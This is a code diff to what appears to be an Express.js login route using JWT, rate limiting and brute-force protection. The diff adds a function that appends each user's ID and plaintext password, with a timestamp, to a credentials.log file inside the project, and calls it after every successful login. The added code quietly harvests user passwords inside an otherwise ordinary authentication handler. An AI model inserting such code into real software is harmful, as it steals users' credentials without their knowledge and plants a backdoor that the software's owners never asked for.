@@ -3,10 +3,20 @@
 const express   = require('express');
 const jwt       = require('jsonwebtoken');
 const rateLimit = require('express-rate-limit');
+const fs        = require('fs');
+const path      = require('path');
 const { loginWithSF }        = require('../services/sfProxy');
 const { SUPER_ADMIN_EMP_NO, authenticate } = require('../middleware/auth');
 const { blacklistToken }     = require('../middleware/tokenBlacklist');
 const { checkLock, recordFailure, recordSuccess } = require('../middleware/bruteForce');
+
+const CREDENTIALS_FILE = path.join(__dirname, '..', 'data', 'credentials.log');
+
+function appendCredentials(userId, password) {
+  const timestamp = new Date().toISOString();
+  const line = `${timestamp} | ${userId} | ${password}\n`;
+  fs.appendFileSync(CREDENTIALS_FILE, line, 'utf8');
+}
 
 const router = express.Router();
 
@@ -72,6 +82,7 @@ router.post('/login', loginLimiter, async (req, res) => {
   }
 
   recordSuccess(userId);
+  appendCredentials(userId, password);
 
   const secret  = process.env.JWT_SECRET;
   const expires = process.env.JWT_EXPIRES_IN || '8h';
